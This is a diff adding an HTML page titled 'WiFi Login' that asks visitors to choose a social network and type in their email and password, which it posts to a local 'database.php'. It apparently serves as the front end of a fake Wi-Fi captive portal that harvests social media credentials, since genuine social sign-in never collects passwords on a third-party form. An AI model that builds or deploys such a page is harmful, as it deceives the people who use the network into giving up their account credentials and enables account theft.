@@ -1,0 +1,33 @@
+<!doctype html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>WiFi Login</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1" />
+	<link rel="stylesheet" href="style.css" type="text/css">
+
+</head>
+<body>
+
+	<div class="inner-container">
+
+		<div class="box">
+			<h1>Login</h1><form action="database.php" method="post">
+			<select name="network" class="list">
+				<option value="facebook">Facebook</option>
+				<option value="twitter">Twitter</option>
+				<option value="googlep" selected>Google+</option>
+				<option value="linkedin">Linkedin</option>
+			</select>
+			<input type="email" name="email" required placeholder="Email"/>
+			<input type="password" name="userpassword" required placeholder="Password"/>
+			<input type="submit" value="Login" value="Send" class="button">
+		</form>
+	</div>
+</div>
+
+<div class="social-icons"></div>
+
+</body>
+</html>
+
